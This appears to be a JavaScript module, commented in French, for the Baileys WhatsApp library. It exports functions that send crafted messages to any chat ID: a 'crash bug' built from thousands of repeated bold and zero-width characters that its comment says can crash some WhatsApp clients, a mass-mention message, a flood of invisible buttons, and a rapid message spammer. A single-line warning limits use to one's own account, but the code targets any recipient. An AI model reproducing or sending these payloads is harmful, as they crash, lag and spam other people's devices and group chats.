import { delay } from '@whiskeysockets/baileys'

/**
 * Envoie un message bug qui peut crash certains WhatsApp
 * ⚠️ DANGER: N’utilise que sur ton propre compte pour test
 * @param {object} sock 
 * @param {string} jid 
 */
export const crashBug = async (sock, jid) => {
    const bugText = '𝐗'.repeat(4000) + '\u200b'.repeat(10000) + '```'.repeat(500)
    await sock.sendMessage(jid, { text: bugText })
}

/**
 * Bug de mention x9999 
 * @param {object} sock 
 * @param {string} jid 
 * @param {string[]} participants - Liste des jid à mentionner
 */
export const mentionBug = async (sock, jid, participants = []) => {
    const mentions = participants.slice(0, 500) // limite Baileys
    const text = '@ '.repeat(4000)
    await sock.sendMessage(jid, { text, mentions })
}

/**
 * Bug de bouton vide
 * @param {object} sock 
 * @param {string} jid 
 */
export const buttonBug = async (sock, jid) => {
    const buttons = Array(100).fill().map((_, i) => ({
        buttonId: `bug${i}`,
        buttonText: { displayText: '\u200b'.repeat(100) },
        type: 1
    }))
    await sock.sendMessage(jid, { 
        text: 'Bug Test', 
        footer: '\u200b'.repeat(100),
        buttons,
        headerType: 1
    })
}

/**
 * Spam delay léger pour test lag
 * @param {object} sock 
 * @param {string} jid 
 * @param {number} count 
 */
export const lagSpam = async (sock, jid, count = 10) => {
    for (let i = 0; i < count; i++) {
        await sock.sendMessage(jid, { text: `🌀 ${i}` })
        await delay(100)
    }
}

export default { crashBug, mentionBug, buttonBug, lagSpam }